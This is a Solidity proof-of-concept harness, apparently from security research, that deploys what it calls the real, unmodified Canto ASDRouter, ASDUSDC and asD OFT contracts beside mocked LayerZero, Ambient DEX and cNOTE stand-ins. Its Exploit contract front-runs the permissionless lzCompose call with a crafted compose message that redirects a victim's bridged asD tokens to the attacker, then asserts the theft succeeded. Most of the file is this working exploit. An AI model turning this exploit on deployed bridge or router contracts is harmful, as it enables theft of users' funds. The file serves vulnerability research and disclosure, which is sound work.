// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

// Real audited Canto sources (compiled by the registry forge project via its
// remappings). The vulnerable ASDRouter, the ASDUSDC wrapper, and the asD
// LayerZero OFT all run UNMODIFIED. Only external systems the bug does not live
// in are doubled below: the LayerZero endpoint, the Ambient DEX, the Compound
// cNOTE market, and the source-chain USDC OFT token.
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ASDRouter} from "../src/canto/contracts/asd/asdRouter.sol";
import {ASDUSDC} from "../src/canto/contracts/asd/asdUSDC.sol";
import {ASDOFT} from "../src/canto/contracts/asd/asdOFT.sol";
import {ICrocSwapDex, ICrocImpact} from "../src/canto/contracts/ambient/CrocInterfaces.sol";

contract MockLZEndpoint {
    function setDelegate(address) external {}
}

contract MintableERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockCNote {
    address public immutable underlyingToken;

    constructor(address note_) {
        underlyingToken = note_;
    }

    function underlying() external view returns (address) {
        return underlyingToken;
    }

    function mint(uint256 mintAmount) external returns (uint256) {
        IERC20(underlyingToken).transferFrom(msg.sender, address(this), mintAmount);
        return 0;
    }
}

contract MockCrocSwap is ICrocSwapDex {
    IERC20 public immutable note;

    constructor(IERC20 note_) {
        note = note_;
    }

    function readSlot(uint256) external pure returns (uint256) {
        return 1;
    }

    function swap(address, address, uint256, bool, bool, uint128 qty, uint16, uint128, uint128, uint8)
        external
        payable
        returns (int128 baseQuote, int128 quoteFlow)
    {
        note.transfer(msg.sender, qty);
        baseQuote = -int128(qty);
        quoteFlow = -int128(qty);
    }
}

contract MockCrocImpact is ICrocImpact {
    function calcImpact(address, address, uint256, bool, bool, uint128 qty, uint16, uint128)
        external
        pure
        returns (int128 baseFlow, int128 quoteFlow, uint128 finalPrice)
    {
        baseFlow = -int128(qty);
        quoteFlow = -int128(qty);
        finalPrice = 1e18;
    }
}

// Thin subclasses so the Playground can attach REAL source views: forge emits
// their artifacts under out/<synthetic>.sol/, but the inherited bytecode maps
// straight back to the unmodified audited files (asdRouter.sol / asdOFT.sol /
// asdUSDC.sol).
contract ASDUSDCView is ASDUSDC {}

contract ASDOFTView is ASDOFT {
    constructor(string memory n, string memory s, address ep, address c, address r) ASDOFT(n, s, ep, c, r) {}
}

contract ASDRouterView is ASDRouter {
    constructor(address noteAddr, uint32 eid, address cs, address ci, address usdc)
        ASDRouter(noteAddr, eid, cs, ci, usdc)
    {}
}

contract Exploit {
    uint32 internal constant CANTO_EID = 1;
    uint256 internal constant AMOUNT = 100e18;
    address internal constant VICTIM = address(0xBEEF);

    MintableERC20 public usdcOFT;
    MintableERC20 public note;
    MockCNote public cNote;
    ASDUSDCView public asdUSDC;
    ASDOFTView public asd;
    MockCrocSwap public crocSwap;
    MockCrocImpact public crocImpact;
    ASDRouterView public router;
    MockLZEndpoint public lz;

    constructor() {
        lz = new MockLZEndpoint(); // nonce 1
        usdcOFT = new MintableERC20("USD Coin OFT", "USDC"); // nonce 2
        note = new MintableERC20("Note", "NOTE"); // nonce 3
        cNote = new MockCNote(address(note)); // nonce 4
        asdUSDC = new ASDUSDCView(); // nonce 5  (REAL asdUSDC.sol)
        asd = new ASDOFTView("asD", "asD", address(lz), address(cNote), address(this)); // nonce 6 (REAL asdOFT.sol)
        crocSwap = new MockCrocSwap(IERC20(address(note))); // nonce 7
        crocImpact = new MockCrocImpact(); // nonce 8

        asdUSDC.updateWhitelist(address(usdcOFT), true);

        router = new ASDRouterView( // nonce 9 (REAL asdRouter.sol, vulnerable)
            address(note),
            CANTO_EID,
            address(crocSwap),
            address(crocImpact),
            address(asdUSDC)
        );

        // Ambient pool liquidity for the asdUSDC -> NOTE swap.
        note.mint(address(crocSwap), AMOUNT);

        // Transaction 1 (LayerZero receive): the victim's bridged USDC OFT is
        // delivered to the router BEFORE the composed message executes.
        usdcOFT.mint(address(router), AMOUNT);
    }

    function run() external {
        // Transaction 2 (permissionless compose): the attacker (this contract)
        // front-runs the executor. ASDRouter.lzCompose has no caller check and
        // trusts the receiver embedded in the payload, so we redirect the minted
        // asD to ourselves.
        bytes memory composeMsg = abi.encode(
            uint32(CANTO_EID), // _dstLzEid -> local transfer branch
            address(this), // _dstReceiver <-- THE THEFT
            address(asd), // _dstAsdAddress
            address(asd), // _cantoAsdAddress
            uint256(0), // _minAmountASD
            VICTIM, // _cantoRefundAddress (unreached on success)
            uint256(0) // _feeForSend
        );

        bytes memory message = abi.encodePacked(
            uint64(1), // nonce
            uint32(999), // srcEid
            AMOUNT, // amountLD
            bytes32(uint256(uint160(VICTIM))), // composeFrom (ignored by router)
            composeMsg
        );

        router.lzCompose(address(usdcOFT), bytes32(uint256(1)), message, address(this), "");

        require(asd.balanceOf(address(this)) == AMOUNT, "attacker did not steal asD");
        require(usdcOFT.balanceOf(address(router)) == 0, "router OFT not consumed");
    }
}
